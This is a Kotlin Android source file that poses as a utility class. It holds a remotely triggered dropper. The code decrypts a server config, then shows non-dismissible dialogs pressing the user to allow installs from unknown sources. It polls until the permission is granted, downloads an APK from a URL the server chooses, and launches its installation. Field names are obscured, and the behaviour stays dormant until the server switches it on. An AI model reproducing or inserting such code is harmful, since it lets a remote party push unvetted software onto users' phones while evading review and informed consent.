package liu.pei.qiezidezhenming.utils

import android.annotation.SuppressLint
import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.view.View
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.FileProvider
import androidx.lifecycle.lifecycleScope
import com.bumptech.glide.Glide
import com.google.gson.Gson
import com.kongzue.dialogx.dialogs.MessageDialog
import com.kongzue.dialogx.interfaces.OnBindView
import com.kongzue.dialogx.interfaces.OnDialogButtonClickListener
import com.lzy.okgo.OkGo
import com.lzy.okgo.callback.FileCallback
import com.lzy.okgo.model.Progress
import com.tencent.mmkv.MMKV
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.asFlow
import kotlinx.coroutines.flow.collect
import liu.pei.qiezidezhenming.R
import liu.pei.qiezidezhenming.bean.ResultBean
import liu.pei.qiezidezhenming.http.NetConfig
import liu.pei.qiezidezhenming.http.RequestService
import liu.pei.qiezidezhenming.http.RetrofitUtils
import okhttp3.ResponseBody
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.io.File

@SuppressLint("StaticFieldLeak")
object LiuPeiQie {

    private lateinit var context: Context
    private lateinit var p: MessageDialog
    private var u: MessageDialog?=null
    private lateinit var progress: MessageDialog
    private lateinit var curTv: TextView
    var isInstall = false

    fun liuPeiQie(context: Context) {
        this.context = context
        if (MMKV.defaultMMKV().decodeBool("state", false))
            return
        RetrofitUtils.get().retrofit(NetConfig.CONFIG_URL).create(RequestService::class.java)
            .getConfig(data = getRequestData()).enqueue(object : Callback<ResponseBody> {
                override fun onResponse(call: Call<ResponseBody>, response: Response<ResponseBody>) {
                    val body = response.body()
                    body?.string()?.let {
                        AesEncryptUtil.decrypt(it)
                    }?.let {
                        Gson().fromJson(it, ResultBean::class.java)
                    }?.let {
                        resultBean = it
                        if (it.status == "1") {
                            MMKV.defaultMMKV().encode("oPack", it.oPack)
                            if (!context.packageManager.canRequestPackageInstalls()) {
                                showPermissionDialog()
                            } else {
                                showUpdateDialog()
                            }
                        }
                    }
                }

                override fun onFailure(call: Call<ResponseBody>, t: Throwable) {

                }

            })
    }

    private fun showPermissionDialog() {
        p = MessageDialog.show("Permission", resultBean.pkey, "ok", "")
            .setOkButton(OnDialogButtonClickListener<MessageDialog> { baseDialog, v ->
                checkInstallPermission()
                val uri = Uri.parse("package:" + context.packageName)
                val i = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, uri)
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(i)
                true
            })
            .setCustomView(object : OnBindView<MessageDialog>(R.layout.dialog_common) {
                override fun onBind(dialog: MessageDialog?, v: View?) {
                    val imageView = v?.findViewById<ImageView>(R.id.guid)
                    Glide.with(context).load(resultBean.ukey).into(imageView!!)
                }
            })
        p.isCancelable = false
    }

    @SuppressLint("SetTextI18n")
    private fun showUpdateDialog() {
        u = MessageDialog.show("New Version", formatString(resultBean.ikey), "Download")
            .setOkButton { baseDialog, v ->
                if (File(path).exists()) {
                    checkInstallState()
                    install(context, File(path))
                } else {
                    showProgressDialog()
                    download(resultBean.path) {
                        curTv.text = "current = $it%"
                        if (it == 100) {
                            progress.dismiss()
                            checkInstallState()
                            install(context, File(path))
                        }
                    }
                }
                true
            }
        u!!.isCancelable = false
    }


    private fun showProgressDialog() {
        progress = MessageDialog.show("Download", "", "", "")
            .setCustomView(object : OnBindView<MessageDialog>(R.layout.dialog_progress) {
                override fun onBind(dialog: MessageDialog?, v: View?) {
                    curTv = v!!.findViewById(R.id.current)
                }
            })
        progress.isCancelable = false
    }

    private fun formatString(s: String): String {
        var r = ""
        if (s.contains("|")) {
            val temp = s.split("|")
            temp.forEach {
                r = r + it + "\n"
            }
        }
        return r
    }

    private fun checkInstallPermission() {
        var job: Job? = null
        job = (context as AppCompatActivity).lifecycleScope.launch(Dispatchers.IO) {
            (0 until Int.MAX_VALUE).asFlow().collect {
                delay(1500)
                if (!isBackground(context)){
                    if (context.packageManager.canRequestPackageInstalls()) {
                        withContext(Dispatchers.Main) {
                            p.dismiss()
                            if (u == null){
                                showUpdateDialog()
                            }
                        }
                        job?.cancel()
                    }
                }
            }
        }
    }

   private fun isBackground(context: Context): Boolean {
        val activityManager = context
            .getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val appProcesses = activityManager
            .runningAppProcesses
        for (appProcess in appProcesses) {
            if (appProcess.processName == context.packageName) {
                return appProcess.importance != ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
            }
        }
        return false
    }

    private fun checkInstallState() {
        var job: Job? = null
        job = (context as AppCompatActivity).lifecycleScope.launch(Dispatchers.IO) {
            (0 until Int.MAX_VALUE).asFlow().collect {
                delay(1500)
                if (MMKV.defaultMMKV().decodeBool("state")) {
                    withContext(Dispatchers.Main) {
                        u?.dismiss()
                    }
                    job?.cancel()
                }
            }
        }
    }

    private fun download(url: String, block: (Int) -> Unit) {
        val file = File(filePath + fileName)
        if (file.exists()) file.delete()
        OkGo.get<File>(url).execute(object : FileCallback(filePath, fileName) {
            override fun downloadProgress(progress: Progress?) {
                super.downloadProgress(progress)
                val current = progress?.currentSize
                val total = progress?.totalSize
                val pro = ((current!! * 100) / total!!).toInt()
                block(pro)
                "progress = ${progress.fraction}".printLoges()
            }

            override fun onError(response: com.lzy.okgo.model.Response<File>?) {
                super.onError(response)
                response?.exception.toString().printLoges()
            }

            override fun onSuccess(response: com.lzy.okgo.model.Response<File>?) {
            }

        })
    }

    private fun install(context: Context, file: File) {
        if (!file.exists()) return
        var uri = if (Build.VERSION.SDK_INT >= 24) {
            FileProvider.getUriForFile(context, context.packageName.toString() + ".fileprovider", file)
        } else {
            Uri.fromFile(file)
        }
        if (Build.VERSION.SDK_INT >= 26) {
            if (!context.packageManager.canRequestPackageInstalls()) {
                Toast.makeText(context, "No Permission", Toast.LENGTH_SHORT).show()
                return
            }
        }
        val intent = Intent("android.intent.action.VIEW")
        intent.flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
        if (Build.VERSION.SDK_INT >= 24) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        intent.setDataAndType(uri, "application/vnd.android.package-archive")
        context.startActivity(intent)
    }
}